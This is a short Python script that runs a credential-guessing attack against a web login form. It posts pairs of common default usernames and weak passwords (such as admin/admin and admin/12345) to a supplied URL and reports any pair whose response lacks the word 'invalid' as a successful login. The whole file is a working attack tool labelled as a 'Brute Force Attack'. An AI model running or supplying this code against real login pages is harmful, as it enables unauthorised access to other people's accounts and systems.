import requests

def brute_forcer(url):
    usernames = ["admin", "user", "test"]
    passwords = ["admin", "12345", "password"]

    print("\nStarting Brute Force Attack...\n")

    for user in usernames:
        for pwd in passwords:
            data = {"username": user, "password": pwd}
            response = requests.post(url, data=data)

            if "invalid" not in response.text.lower():
                print(f"[+] Login Successful -> {user}:{pwd}")
                return

    print("[-] Brute Force Failed")
